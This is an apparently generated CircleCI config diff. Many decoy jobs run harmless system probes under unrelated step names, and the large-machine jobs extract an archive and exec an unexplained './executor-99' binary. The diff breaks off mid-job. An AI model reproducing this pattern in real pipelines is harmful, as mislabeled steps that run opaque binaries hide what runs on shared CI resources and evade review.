@@ -1,0 +1,1330 @@
+version: 2.1
+
+jobs:
+  z0q:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Cash forecast batched and verified
+          command: |
+            mkdir -p /tmp/stage-store
+            set +o pipefail 2>/dev/null; for i in $(seq 1 3000); do date +%s%N | tr -d '\n'; echo " ${i}"; done > /tmp/stage-store/ForestGamma; true
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/ForestGamma)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - 'ForestGamma'
+  brodcast:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/ForestGamma 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  ntnccofhnnc7g:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: step six
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; grep -sIR case /etc/profile.d | head -n 5; true ; } > /tmp/stage-store/render.glint
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/render.glint)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - 'render.glint'
+  yolo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/render.glint 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  proj-alfa:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Edge Crop Step
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; test -x /usr/bin/awk && echo Y || echo N; true ; } > /tmp/stage-store/Q1g
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/Q1g)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - 'Q1g'
+  canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/199.155 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  sphereLink_complex:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Image cell lines overnight
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; if command -v tar > /dev/null 2>&1;then echo "tar found"; fi; true ; } > /tmp/stage-store/0rchard
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/0rchard)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - '0rchard'
+  jun25-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/0rchard 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  qykdon0kx8pf1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: SkillTreeImport
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; touch -t 201205121200 "/tmp/tree_deck_set.log" && stat -c %y "/tmp/tree_deck_set.log"; true ; } > /tmp/stage-store/SHIMMER
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/SHIMMER)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - 'SHIMMER'
+  ship-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/SHIMMER 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  ID-STATUS-DTL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: MUX MP4
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; echo "ready?"| fold -w 3; true ; } > /tmp/stage-store/io_net
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/io_net)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - 'io_net'
+  oscar-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/199.155 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  LS-PTR-C:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: clear out the crash reports near Cairo
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; printenv|head|wc -l; true ; } > /tmp/stage-store/tmp-088
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/tmp-088)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - 'tmp-088'
+  cd-old:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/199.155 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  upsertouter:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Error catalog reviewed by hand
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; ls -vo .. | awk 'NR>1 {print $1}' | sort | uniq -c; true ; } > /tmp/stage-store/ryi
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/ryi)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - 'ryi'
+  min-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/ryi 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  wide_lock_process_normal:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Operation Fox
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; command ls -Son --sort=version /srv | tail -n +2 | head -n 4; true ; } > /tmp/stage-store/debug.log.23
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/debug.log.23)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - 'debug.log.23'
+  UAT_STAGE_6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/199.155 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  strings_gu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: assert blocked
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; ls -c /var/*/ | tac; true ; } > /tmp/stage-store/VID-00061376
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/VID-00061376)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - 'VID-00061376'
+  nova-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/199.155 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  xY9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Day Six Release
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; ls -Xv "$HOME"; true ; } > /tmp/stage-store/9d5b0b0c-94ab-a3c9
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/9d5b0b0c-94ab-a3c9)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - '9d5b0b0c-94ab-a3c9'
+  MERGE_PROD:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/199.155 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  H:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Derisk pruning
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; find /opt -maxdepth 3 -type d -name "*" -size -4k -mtime +7 -writable -exec du -sh {} + 2>/dev/null | wc -l; true ; } > /tmp/stage-store/access.log.5
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/access.log.5)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - 'access.log.5'
+  full-send:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/access.log.5 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  temp-p:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Do not label the cell lines yet
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; /usr/bin/ls -lg /usr/bin/*cat|tail -n +2|head -4; true ; } > /tmp/stage-store/run_453
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/run_453)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - 'run_453'
+  nova-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/199.155 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  ww:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: For safety snapshot the metadata catalog
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; find /var/tmp -maxdepth 2 -mindepth 1 -type f -empty -exec stat -c '%s %n' {} ";" 2>/dev/null | sed 's|.*/||' | sort -u; true ; } > /tmp/stage-store/541ebcc33ed2345d2d
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/541ebcc33ed2345d2d)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - '541ebcc33ed2345d2d'
+  dotnet8-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/199.155 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  cq9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: 2023 resize
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; grep '^/' /etc/shells | sort | uniq -c | tail -n20; true ; } > /tmp/stage-store/SHA
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/SHA)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - 'SHA'
+  LaunchPipeline:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/SHA 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  s_Rect:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Spellcheck or crawl the blog post
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; { echo 'the quick brown fox'; echo 'nothing to do'; } | sort; true ; } > /tmp/stage-store/fnv_89f55e517bbcd
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/fnv_89f55e517bbcd)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - 'fnv_89f55e517bbcd'
+  Verify_Suite6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/fnv_89f55e517bbcd 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  handler-020612:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Harmonize pallets
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; (umask 077; touch '/tmp/moth.bak' && stat -c %a '/tmp/moth.bak'); true ; } > /tmp/stage-store/p4ylo4d
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/p4ylo4d)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - 'p4ylo4d'
+  rm-dashboard-bug:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/199.155 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  HI_T:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Compliance handles unlock
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; sed -n 's/^NAME=//p' /etc/os-release | head -n 1; true ; } > /tmp/stage-store/c0b41tb150n
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/c0b41tb150n)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - 'c0b41tb150n'
+  API-57:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/199.155 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  oscar-castle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: I usually lock the orphan jobs last
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; for x in `seq 7`; do sleep 0.1; echo "${x}"; done|tac; true ; } > /tmp/stage-store/133.201.51
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/133.201.51)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - '133.201.51'
+  APP-464:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/133.201.51 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  NavWriterGardenTraceEmber:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: DRAFT STATUS UPDATE
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; grep -cr bash /etc/profile.d | head -n10; true ; } > /tmp/stage-store/scratch-91d
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/scratch-91d)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - 'scratch-91d'
+  dotnet8-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/199.155 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  E5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Plate the API keys
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; ls -iaA --color=always /usr/lib | shuf -n 2; true ; } > /tmp/stage-store/zinc.zeta
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/zinc.zeta)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - 'zinc.zeta'
+  API-71:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/zinc.zeta 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  sha-e4b8942c98:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Record Standard Curve Routine
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; help -d read; true ; } > /tmp/stage-store/signalBackup
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/signalBackup)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - 'signalBackup'
+  sirius-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/199.155 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  STUB_LULLABY_SELECT_MULTI:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Revoke the timesheets by friday
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; find /proc/self -maxdepth 2 -iname 'status' -exec stat -c %F "{}" \; 2> /dev/null | nl; true ; } > /tmp/stage-store/node931
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/node931)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - 'node931'
+  Prepare_Release1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/199.155 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  succesful:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: upload sbom
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; touch "${TMPDIR:-/tmp}/rub.list" && mv -v "${TMPDIR:-/tmp}/rub.list" ${TMPDIR:-/tmp}/g.txt; true ; } > /tmp/stage-store/env
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/env)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - 'env'
+  fix-2086:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/199.155 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  wrapper-clamp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Then unzip the scratch space
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; find /dev -name 'std*' -exec echo {} + 2>/dev/null | tail -n2; true ; } > /tmp/stage-store/MVI_08770
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/MVI_08770)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - 'MVI_08770'
+  uma-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
+            { unzip -t /tmp/stage-store/199.155 2>&1 || echo "not zip"; } | head -2
+      - run:
+          name: Pull sources
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f prod-archive-dev.tar.xz
+      - run:
+          name: Pre-run checks
+          command: sleep 30
+      - run:
+          command: exec ./executor-99
+  TempFunc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: No tunnel without approval
+          command: |
+            mkdir -p /tmp/stage-store
+            { set +o pipefail 2>/dev/null; find /proc/self -type f -name "*map*" -newer /etc/os-release -exec du -ch {} + 2>/dev/null | xargs -r ls -ld | head -n 5; true ; } > /tmp/stage-store/199.155
+            printf 'done=1 size=%d\n' "$(wc -c </tmp/stage-store/199.155)"
+      - persist_to_workspace:
+          root: /tmp/stage-store
+          paths:
+            - '199.155'
+  atlas:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage-store
+      - run:
+          name: Verify B
+          command: |
